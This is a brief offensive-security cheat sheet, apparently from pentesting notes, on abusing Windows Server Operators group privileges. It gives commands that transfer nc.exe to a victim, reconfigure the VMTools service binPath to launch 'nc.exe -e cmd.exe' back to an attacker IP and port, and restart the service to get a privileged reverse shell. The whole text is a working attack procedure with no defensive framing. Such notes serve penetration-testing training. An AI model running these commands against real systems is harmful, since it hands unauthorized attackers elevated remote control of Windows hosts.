Some groups have certain privileges that can be exploited

## Server Operators

Exploitation
```bash
# List services running on target
services
	examples may include VMTools, VGAuthService, etc...

# Transfer over nc.exe to victim

# Modify path
sc.exe config VMTools binPath="C:\Path\to\nc.exe -e cmd.exe <attack_ip> <lport>"

# Start nc listener

# Restart VMTools
sc.exe stop VMTools
sc.exe start VMTools
```